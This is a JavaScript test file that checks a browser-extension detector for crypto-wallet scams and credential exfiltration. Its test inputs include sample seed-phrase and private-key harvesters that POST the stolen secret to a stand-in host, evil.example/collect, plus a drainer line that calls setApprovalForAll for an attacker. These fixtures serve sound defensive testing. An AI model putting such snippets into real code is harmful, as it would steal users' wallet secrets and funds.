// Pins the scam / crypto-drain AST detector (roadmap P2). Extracts the real
// detectScamSignals from the generated bg/analyzer.js and asserts it flags
// wallet-drainer / credential-exfil patterns with high severity while NOT
// false-positiving on benign wallet-adjacent scripts.
import { describe, expect, it } from 'vitest';
import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';

function extractFn(src, name) {
  const marker = `function ${name}(`;
  const start = src.indexOf(marker);
  if (start === -1) throw new Error(`${name} not found`);
  const braceStart = src.indexOf('{', start);
  let depth = 0;
  for (let i = braceStart; i < src.length; i += 1) {
    if (src[i] === '{') depth += 1;
    if (src[i] === '}') { depth -= 1; if (depth === 0) return src.slice(start, i + 1); }
  }
  throw new Error(`unterminated ${name}`);
}

const src = readFileSync(resolve(process.cwd(), 'bg/analyzer.js'), 'utf8');
// detectScamSignals references module-level SCAM_* regexes; pull them in too.
// The generator emits them as `var SCAM_WALLET_SECRET = ...` just before the fn.
const regexStart = src.search(/(?:const|var|let)\s+SCAM_WALLET_SECRET/);
const regexes = src.slice(regexStart, src.indexOf('function detectScamSignals'));
const detectScamSignals = new Function(`${regexes}\n${extractFn(src, 'detectScamSignals')}\nreturn detectScamSignals;`)();

const ids = (r) => r.findings.map((f) => f.id);

describe('scam / crypto-drain detector', () => {
  it('flags a seed-phrase harvester that exfiltrates as high-severity credential exfiltration', () => {
    const code = `
      const phrase = document.querySelector('#mnemonic').value;
      fetch('https://evil.example/collect', { method: 'POST', body: phrase });
    `;
    const r = detectScamSignals(code);
    expect(ids(r)).toContain('wallet-seed-access');
    expect(ids(r)).toContain('credential-exfil');
    expect(r.risk).toBeGreaterThanOrEqual(80); // 35 + 60 → high
  });

  it('flags wallet-drainer keywords', () => {
    const r = detectScamSignals(`await contract.setApprovalForAll(attacker, true); sweepWallet();`);
    expect(ids(r)).toContain('wallet-drainer-keywords');
  });

  it('flags a wallet transaction as a moderate (not exfil) signal', () => {
    const r = detectScamSignals(`window.ethereum.request({ method: 'eth_sendTransaction', params });`);
    expect(ids(r)).toContain('wallet-transaction');
    expect(ids(r)).not.toContain('credential-exfil');
  });

  it('does NOT flag a benign wallet-adjacent script (reads window.ethereum, requests accounts)', () => {
    const code = `
      if (window.ethereum) {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        document.getElementById('addr').textContent = accounts[0];
      }
    `;
    const r = detectScamSignals(code);
    expect(r.findings).toHaveLength(0);
    expect(r.risk).toBe(0);
  });

  it('does NOT raise the exfil correlation for seed access without a network send', () => {
    const r = detectScamSignals(`const pk = wallet.privateKey; console.log(pk);`);
    expect(ids(r)).toContain('wallet-seed-access');
    expect(ids(r)).not.toContain('credential-exfil');
  });

  it('does NOT flag a WebCrypto script that generates a keypair and fetches', () => {
    const code = `
      const keyPair = await crypto.subtle.generateKey({ name: 'RSA-PSS', hash: 'SHA-256' }, true, ['sign']);
      const sig = await crypto.subtle.sign('RSA-PSS', keyPair.privateKey, data);
      await fetch('/api/verify', { method: 'POST', body: sig });
    `;
    const r = detectScamSignals(code);
    expect(ids(r)).not.toContain('wallet-seed-access');
    expect(ids(r)).not.toContain('credential-exfil');
  });

  it('does NOT ban a non-wallet private-key tool that calls fetch as exfiltration', () => {
    // An SSH/JWT helper that references "privateKey" and fetches must not be
    // flagged as high-severity wallet exfiltration (no wallet context).
    const code = `
      const privateKey = document.getElementById('sshKey').value;
      fetch('/api/deploy', { method: 'POST', body: privateKey });
    `;
    const r = detectScamSignals(code);
    expect(ids(r)).not.toContain('credential-exfil');
  });

  it('still flags a wallet-context private-key harvester that exfiltrates', () => {
    const code = `
      const pk = window.ethereum.selectedAddress && wallet.privateKey;
      fetch('https://evil.example/collect', { method: 'POST', body: pk });
    `;
    const r = detectScamSignals(code);
    expect(ids(r)).toContain('credential-exfil');
  });
});
